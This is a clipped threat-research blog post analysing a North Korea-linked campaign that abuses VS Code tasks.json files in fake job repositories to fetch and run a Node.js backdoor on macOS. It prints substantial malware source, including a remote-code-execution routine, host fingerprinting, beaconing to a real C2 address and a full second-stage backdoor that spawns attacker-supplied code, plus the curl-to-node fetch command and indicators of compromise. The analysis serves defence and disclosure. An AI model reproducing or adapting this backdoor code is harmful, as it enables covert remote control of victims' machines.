---
title: "Threat Actors Expand Abuse of Microsoft Visual Studio Code"
url: https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/
clipped: 2026-06-17 01:55:19
source: "HackerNews Digest"
tags:
  - hn-digest
  - clipping
---

# [Threat Actors Expand Abuse of Microsoft Visual Studio Code](https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/)

## Digest Summary
The campaign, linked to a North‑Korean threat actor, leverages Microsoft Visual Studio Code tasks.json files to execute malicious code when a victim opens a cloned GitHub or GitLab repository in VS Code. Granting repository trust triggers a background command on macOS that runs `nohup bash -c "curl -s  | node"` to fetch an obfuscated JavaScript payload hosted on vercel.app. The payload (SHA‑256 932a678…) contains largely dead code but implements a persistent backdoor that:

- Beacons every 5 seconds to a C2 server, sending hostname, MAC addresses, OS details and public IP (via ipify.org).  
- Executes arbitrary JavaScript supplied by the C2, allowing dynamic import of Node.js modules and full remote code execution.  
- Can spawn child processes, terminate itself, and clean up on attacker command.

Subsequent payloads reuse the same C2 infrastructure and show AI‑generated code comments. The abuse demonstrates adaptation of developer tools for macOS malware delivery. Mitigations include enabling Jamf Threat Prevention/Advanced Threat Controls in block mode and vetting third‑party repositories and npm install scripts before trusting them.

## Discussion Summary
None

---

## Full Article

Threat Actors Expand Abuse of Microsoft Visual Studio Code
==========================================================

Jamf Threat Labs identifies additional abuse of Visual Studio Code. See the latest evolution in the Contagious Interview campaign.

**By Thijs Xhaflaire**

Introduction
------------

At the end of last year, Jamf Threat Labs published research related to the [Contagious Interview campaign](https://www.jamf.com/blog/flexibleferret-malware-continues-to-adapt/), which has been attributed to a threat actor operating on behalf of North Korea (DPRK). Around the same time, researchers from [OpenSourceMalware](https://opensourcemalware.com/blog/contagious-interview-vscode) (OSM) released additional findings that highlighted an evolution in the techniques used during earlier stages of the campaign.

Specifically, these newer observations highlight an additional delivery technique alongside the previously documented ClickFix-based techniques. In these cases, the infection chain abuses Microsoft Visual Studio Code task configuration files, allowing malicious payloads to be executed on the victim system.

Following the discovery of this technique, both Jamf Threat Labs and OSM continued to closely monitor activity associated with the campaign. In December, Jamf Threat Labs identified additional abuse of Visual Studio Code `tasks.json` configuration files. This included the introduction of dictionary files containing heavily obfuscated JavaScript, which is executed when a victim opens a malicious repository in Visual Studio Code.

Jamf Threat Labs shared these findings with OSM, who subsequently [published](https://opensourcemalware.com/blog/contagious-interview-malicious-dictionary) a more in-depth technical analysis of the obfuscated JavaScript and its execution flow.

Earlier this week, Jamf Threat Labs identified another evolution in the campaign, uncovering a previously undocumented infection method. This activity involved the deployment of a backdoor implant that provides remote code execution capabilities on the victim system.

At a high level, the chain of events for the malware look like so:

![](https://media.jamf.com/images/news/2026/jtl-image.webp?q=80&w=200)
![]()

Throughout this blog post we will shed light on each of these steps.

Initial Infection
-----------------

In this campaign, infection begins when a victim clones and opens a malicious Git repository, often under the pretext of a recruitment process or technical assignment. The repositories identified in this activity are hosted on either GitHub or GitLab and are opened using Visual Studio Code.

When the project is opened, Visual Studio Code prompts the user to trust the repository author. If that trust is granted, the application automatically processes the repository’s `tasks.json` [configuration file](https://code.visualstudio.com/docs/debugtest/tasks), which can result in embedded arbitrary commands being executed on the system.

![](https://media.jamf.com/images/news/2026/trust-author.webp?q=80&w=600)
![]()

On macOS systems, this results in the execution of a background shell command that uses `nohup bash -c` in combination with `curl -s` to retrieve a JavaScript payload remotely and pipe it directly into the Node.js runtime. This allows execution to continue independently if the Visual Studio Code process is terminated, while suppressing all command output.

![](https://media.jamf.com/images/news/2026/vscode.webp?q=80&w=1000)
![]()

In observed cases, the JavaScript payload is hosted on `vercel.app`, a platform that has been increasingly used in recent [DPRK-related activity](https://opensourcemalware.com/blog/contagious-interview-vscode) following a move away from other hosting services, as previously documented by OpenSourceMalware.

Jamf Threat Labs reported the identified malicious repository to GitHub, after which the repository was removed. While monitoring the activity prior to takedown, we observed the URL referenced within the repository change on multiple occasions. Notably, one of these changes occurred after the previously referenced payload hosting infrastructure was taken down by Vercel.

The JavaScript Payload
----------------------

Once execution begins, the JavaScript payload implements the core backdoor logic observed in this activity. While the payload appears lengthy, a significant portion of the code consists of unused functions, redundant logic, and extraneous text that is never invoked during execution `(SHA256: 932a67816b10a34d05a2621836cdf7fbf0628bbfdf66ae605c5f23455de1e0bc)`. This additional code increases the size and complexity of the script without impacting its observed behavior. It is passed to the node executable as one large argument.

Focusing on the functional components, the payload establishes a persistent execution loop that collects basic host information and communicates with a remote command-and-control (C2) server. Hard-coded identifiers are used to track individual infections and manage tasks from the server.

### Core backdoor functionality

While the JavaScript payload contains a significant amount of unused code, the backdoor's core functionality is implemented through a small number of routines. These routines provide remote code execution, system fingerprinting, and persistent C2 communication.

**Remote code execution capability**

The payload includes a function that enables the execution of arbitrary JavaScript while the backdoor is active. At its core, this is the main functionality of this backdoor.

```
function Hp(_0x2d7a84) {
  try {
    return new Function('require', _0x2d7a84)(require);
  } catch {}
}
```

This function allows JavaScript code supplied as a string to be dynamically executed over the course of the backdoor lifecycle. By passing the `require`function into the execution context, attacker-supplied code can import additional Node.js modules allowing additional arbitrary node functions to be executed.

**System fingerprinting and reconnaissance**

To profile the infected system, the backdoor collects a small set of host-level identifiers:

```
function Mp() {
  return {
    hostname: _0x2b1193,
    macs: _0x56ed9b,
    os: _0x1ac0fe + " " + _0x35b84f + " (" + _0x3fea09 + ")"
  };
}
```

This routine gathers the system hostname, MAC addresses from available network interfaces, and basic operating system details. These values provide a stable fingerprint that can be used to uniquely identify infected hosts and associate them with a specific campaign or operator session.

In addition to local host identifiers, the backdoor attempts to determine the victim’s public-facing IP address by querying the external service ipify.org, a technique that has also been observed in prior DPRK-linked campaigns.

**Command-and-control beaconing and task execution**

Persistent communication with the C2 server is implemented through a polling routine that periodically sends host information and processes server responses. The beaconing logic is handled by the following function:

```
async function jo() {
  let _0x53639c = await Ip.get('http://87.236.177.9:3000/api/errorMessage', {
    params: {
      sysInfo: _0x358fa0,
      exceptionId: 'env19475',
      instanceId: So
    }
  });

  if (_0x53639c.data.status === 'error') {
    Hp(_0x53639c.data.message || "Unknown error");
  }
}

setInterval(jo, 0x1388);
```

This function periodically sends system fingerprinting data to a remote server and waits for a response. The beacon executes every five seconds, providing frequent interaction opportunities.

The server response indicates successful connectivity and allows the backdoor to maintain an active session while awaiting tasking.

```
Request:

GET /api/errorMessage?sysInfo[hostname]=ManagedMachine2&sysInfo[macs][0]=9e:8f:cf:6c:04:5c&sysInfo[os]=Darwin+25.0.0+(darwin)&exceptionId=env19475&instanceId=414066c0-a6e8-4fcb-81bc-4ccf52f39999 HTTP/1.1
Host: 87.236.177.9:3000
User-Agent: axios/1.13.2
Accept: application/json
Connection: keep-alive

-----

Response:

HTTP/1.1 200 OK
Content-Type: application/json
Connection: timeout=5

{"status":"ok","message":"server connected", "instanceId":"414066c0-a6e8-4fcb-81bc-4ccf52f39999"}
```

If the server response contains a specific status value, the contents of the response message are passed directly to the remote code execution routine, mentioned prior.

Further Execution and Instructions
----------------------------------

While monitoring a compromised system, Jamf Threat Labs observed further JavaScript instructions being executed roughly eight minutes after the initial infection. The retrieved JavaScript went on to set up a very similar payload to the same C2 infrustructure.

```
/opt/homebrew/Cellar/node/24.8.0/bin/node -e 
 let agentId = "d2bdc4a4-6c8a-474a-84cf-b3219a1e68e4"
  const SERVER_IP = "http://87.236.177.9:3000/"
  let handleCode = "8503488878"

  const { spawn, spawnSync } = require("child_process");
  const os = require("os");
  const path = require("path");
  const managedPids = new Set();
    
  function stopAllProcesses() {
    for (const pid of managedPids) {
      try {
        if (process.platform === "win32") {
          require("child_process").spawn("taskkill", ["/PID", String(pid), "/T", "/F"], { stdio: "ignore" });
        } else {
          process.kill(-pid, "SIGTERM");
          setTimeout(() => { try { process.kill(-pid, "SIGKILL"); } catch {} }, 1000);
        }
      } catch {}
    }
    managedPids.clear();
  }
    
        async function getSystemInfo() {
      // PC hostname
      const hostname = os.hostname();
    
      // MACs (from all interfaces)
      const macs = Object.values(os.networkInterfaces())
        .flat()
        .filter(Boolean)
        .map(n => n.mac)
        .filter(mac => mac && mac !== "00:00:00:00:00:00");
    
      // OS details
      const osName = os.type();
      const osRelease = os.release();
      const platform = os.platform();
    
      // Public IP
      let publicIp = "unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        publicIp = data.ip;
      } catch (err) {
        reportError('deps-address',err)
      }
    
      return {
        hostname,
        publicIp,
        macs,
        os: osName + " " + osRelease + " (" + platform + ")"
      };
    }

    async function reportError(type, error) {
      const payload = {
        type,                      // you can adjust type as needed
        hostname: os.hostname(),
        message: error.message || String(error),
        agentId,
        handleCode
      };
      try {
      const url = SERVER_IP + "api/reportErrors"
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
      } catch (e) {
      }
    }
    
    async function requestServer (sysInfo) {
      new Promise((resolve, reject) => {
        const url = SERVER_IP + "api/handleErrors"
        fetch( url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"   // telling server we send JSON
            },
            body: JSON.stringify({
              agentId: agentId,
              handleCode: handleCode.toString(),
              sysInfo
            })
        }).then(res => res.json())   // parse JSON response
        .then(data => {
          const {responseCode, messages, status, newAgentId} = data
          if (responseCode) handleCode = responseCode
          if (responseCode == '-1') {
            stopAllProcesses()
            setTimeout(() => process.exit(0), 2000);
          }
          if (newAgentId && newAgentId !== "") agentId = newAgentId
          if (messages && Array.isArray(messages)) {
            for (let i = 0; i < messages.length; i++) {
              const message = messages[i]
              var safeCwd;
              try {
                safeCwd = process.cwd();
              } catch (e) {
                safeCwd = os.homedir();
              }
              try {
                process.on("SIGHUP", () => { /* ignore */ });
                const child = spawn(process.execPath, ["-"], {
                cwd: safeCwd, 
                  detached: true,
                  windowsHide: true,
                  stdio: ["pipe", "ignore", "ignore"]
                });
                child.stdin.write(message);
                child.stdin.end();
                child.on("error", (error) => {
                  reportError('deps-child-main',error)
                });
                child.unref();
                managedPids.add(child.pid);
              } catch (error) {
                reportError("deps-running", error)
              }
            }
          }
          resolve()
        })
        .catch(error => {
          resolve()
          reportError('deps-main',error)
          console.log(error)
        });
      });
    }
    
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    
    (async () => {
      try {

      const sysInfo = await getSystemInfo()
      while (true) {
        const timeout = new Promise((_, rej) => setTimeout(() => rej("timeout"), 10_000));
        try {
          await Promise.race([requestServer(sysInfo), timeout]);
          await sleep(5000); // wait 2s after a normal finish
        } catch (e) {
          if (e === "timeout") continue; // timed out → try again immediately
          await sleep(5000);             // other error → wait 2s then retry
        }
      }
      } catch(error) {
       reportError('deps-theard',error)
      }
    })();
```

Review of this retrieved payload yields a few interesting details...

1. It beacons to the C2 server every 5 seconds, providing its system details and asks for further JavaScript instructions.
2. It executes that additional JavaScript within a child process.
3. It's capable of shutting itself and child processes down and cleaning up if asked to do so by the attacker.
4. It has inline comments and phrasing that appear to be consistent with AI-assisted code generation.

Conclusion
----------

This activity highlights the continued evolution of DPRK-linked threat actors, who consistently adapt their tooling and delivery mechanisms to integrate with legitimate developer workflows. The abuse of Visual Studio Code task configuration files and Node.js execution demonstrates how these techniques continue to evolve alongside commonly used development tools.

Jamf Threat Labs will continue to track these developments as threat actors refine their tactics and explore new ways to deliver macOS malware. We strongly recommend that customers ensure Threat Prevention and Advanced Threat Controls are enabled and set to block mode in Jamf for Mac to remain protected against the techniques described in this research.

Developers should remain cautious when interacting with third-party repositories, especially those shared directly or originating from unfamiliar sources. Before marking a repository as trusted in Visual Studio Code, it’s important to review its contents. Similarly, "npm install" should only be run on projects that have been vetted, with particular attention paid to package.json files, install scripts, and task configuration files to help avoid unintentionally executing malicious code.

Indicators or Compromise
------------------------

```
Repository URL: https://github.com/CannonOps/backend/blob/dev/.vscode/tasks.json
Repository URL: https://github.com/CannonOps/frontend-website/blob/dev/.vscode/tasks.json
Malicious Vercel URL: https://edgeauth.vercel.app/api/getMoralisData?token=Z4T9QH
Malicious Vercel URL: https://moralmetrics.vercel.app/api/getMoralisData?token=Z4T9QH 
C2 IP: 87.236.177.9:3000
C2 DNS: srv37746.hosted-by-eurohoster.org
Javascript Payload SHA256: 932a67816b10a34d05a2621836cdf7fbf0628bbfdf66ae605c5f23455de1e0bc
JavaScript Payloads sharing similarities:
SHA256: 67c05c1624a227959728e960e4563435db2519a24a46e95207a42ea8d4307e2d
SHA256: f8ae6ae9d6a13a8dddb05975930161601b5cfdd0cec30b7efdc5ba0606774998
SHA256: 71e4ea17c871b983a2cbbea7a4fbd7fe498951c8fe4a1e17377e9aa06fd7184a
SHA256: 71d8a974548e4e152e2c818d1febb7862632c1f9bff6adaa731bbaf6b23bd4b9
SHA256: 1b26f73fa88f8c3b17adf6db12ec674481db1f92eb04806815b8fbd6086f07ef
SHA256: a2194390105731ce33cb9a51011c42a39a440942e907099f072916a36f17ef4b
```

Dive into more Jamf Threat Labs research on our blog.